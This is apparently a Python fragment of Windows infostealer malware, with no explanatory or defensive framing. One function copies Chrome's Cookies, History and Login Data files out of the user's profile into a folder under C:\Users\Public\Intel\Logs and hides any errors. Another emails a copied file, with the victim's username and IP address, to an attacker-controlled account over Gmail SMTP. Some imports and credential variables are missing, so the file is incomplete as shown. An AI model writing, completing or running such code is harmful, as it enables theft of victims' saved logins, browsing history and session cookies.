import os
import shutil
import getpass

currentdir = os.getcwd()
curentuser = getpass.getuser()

path_to_cookies = "C:\Users\Public\Intel\Logs"

def cookiestealer():
	cookiepath = 'C://Users//' + curentuser + '//AppData//Local//Google//Chrome//User Data//Default//'

	cookiefile = 'Cookies'
	historyfile = 'History'
	LoginDatafile = "Login Data"

	copycookie = cookiepath + "//" + cookiefile
	copyhistory = cookiepath + "//" + historyfile
	copyLoginData = cookiepath + "//" + LoginDatafile

	filesindir = os.listdir(path_to_cookies)

	if copycookie not in filesindir:
		try:
			shutil.copy2(copycookie, path_to_cookies)
		except:
			pass
	else:
		pass
		
	if copyhistory not in filesindir:
		try:
			shutil.copy2(copyhistory, path_to_cookies)
		except:
			pass
	else:
		pass
	
	if copyLoginData not in filesindir:
		try:
			shutil.copy2(copyLoginData, path_to_cookies)
		except:
			pass
	else:
		pass
		
	return True
	
def sendData(fname,fext):
	
	attach = "C:\Users\Public\Intel\Logs"+'\\'+fname+fext
	
	ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
	SERVER = "smtp.gmail.com"
	PORT = 465
	USER= userkey
	PASS= passkey
	FROM = USER
	TO = userkey
	SUBJECT = "Attachment "+ "From --> " + curentuser+ " Time --> " + str(ts)
	TEXT = "This attachment is sent from python" + '\n\nUSER : ' + curentuser + '\nIP address : ' + ip_address
	
	message = MIMEMultipart()
	message['From'] = FROM
	message['To'] = TO
	message['Subject'] = SUBJECT
	message.attach(MIMEText(TEXT))

	part = MIMEBase('application', 'octet-stream')
	part.set_payload(open(attach, 'rb').read())
	Encoders.encode_base64(part)
	part.add_header('Content-Disposition','attachment; filename="%s"' % os.path.basename(attach))
	message.attach(part)
	
	try:
		server = smtplib.SMTP_SSL()
		server.connect(SERVER,PORT)
		server.ehlo() 
		server.login(USER,PASS)
		server.sendmail(FROM, TO, message.as_string())
		server.close()
	except Exception as e:
		pass

	return True
